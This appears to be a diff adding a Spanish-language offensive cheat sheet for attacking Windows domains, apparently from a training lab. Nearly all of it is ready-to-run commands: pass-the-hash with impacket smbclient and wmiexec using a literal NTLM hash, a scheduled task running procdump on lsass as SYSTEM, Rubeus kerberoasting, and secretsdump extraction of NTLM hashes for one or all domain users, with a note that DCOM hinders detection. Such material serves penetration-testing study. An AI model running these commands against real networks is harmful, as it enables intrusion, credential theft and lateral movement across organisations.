@@ -1,0 +1,35 @@
+#	Atacando Windows	#
+runas /netonly /user:<dominio>\<usuario> powershell.exe
+#Ejecuto una shell en windows con el usuario del cual tenemos la contraseña
+
+$session = New-PsSession -ComputerName <host> -Credential $cred
+#Creo una sesion para poder usarla y mandar archivos
+Copy-Item -Path C:\test_to.txt -Destination C:\ -ToSession $session
+Copy-Item -Path C:\test_from.txt -Destination C:\Users\ -FromSession
+#Con esto copio desde o hasta la $session
+
+DomainGPOUserLocalGroupMapping <usuario>
+#Sirve para ver informacion del usuario como grupos, computer name, etc
+#ESto solo puede realizarse una vez os conectamos a powershell_ise.exe de un usuario y corremos un script (powerview)
+
+python3 /usr/share/doc/python3-impacket/examples/smbclient.py <domain>/<user>@<sv domain> -hashes :<NTLM hash>
+#Nos conectamos mediante SMB con la tecnica pth
+
+	##wmic
+python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -nooutput -hashes :22f2159367e48368855b7620fe330a8c <dominio/usr@servidor> "powershell.exe -command \$h= gwmi win32_OperatingSystem  -computername mccoy.voltron.cyberaces.io ; \$h.convertToDateTime(\$h.LocalDateTime) > C:\Users\Public\mccoytime.txt"
+#De esta forma podemos obtener la hora del SO para poner una tarea a X hora con el siguiente comando. wmic sirve para ejecutar cualquier comando impersonando al usuario
+python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -nooutput -hashes :22f2159367e48368855b7620fe330a8c  <dominio/usr@servidor> "powershell.exe -command schtasks /create /sc once /st <Hora:minutos> /tn <nombre> /tr '<C:\Users\procdump64.exe -ma lsass.exe C:\Users\Public\lsass.dmp>' /ru SYSTEM /s <servidor>"
+
+	#NTLM, TGS y kerberoasting
+Rubeus.exe /creduser:<comp_user> /credpassword:<comp_password> /user:<user>
+#Si tenemos un usuario podemos intentar usar las credenciales para obtener el hash TGS  del <user>
+python3 ./secretsdump.py -just-dc-ntlm -just-dc-user <domain>/<target_user> <domain>/<ad_user>@<ip>
+#Una vez obtenido la password gracias a crackear el TGS de un usuario de dominio administrador, podemos intentar obtener el hash NTLM del user especificado
+python3 ./secretsdump.py -just-dc-ntlm  <domain>/<ad_user>@<ip>
+#Tambien podemos no especificar un usuario para que nos de el NTLM de todos los usuarios
+
+	##dcom
+#Medio de comunicacin en sistemas windows que permite usarse con aplicaciones COM-enabled mediante RPC. Todo lo que se ejecuta con DCOM se hace en el contexto de la aplicacion que lo esta aljando. De esta forma, genera que
+#la deteccion sea complicada
+#EN Kali existe dcomexec.py dentro de impacket. Sirve para usar DCOM en linux usando NTLM.
+
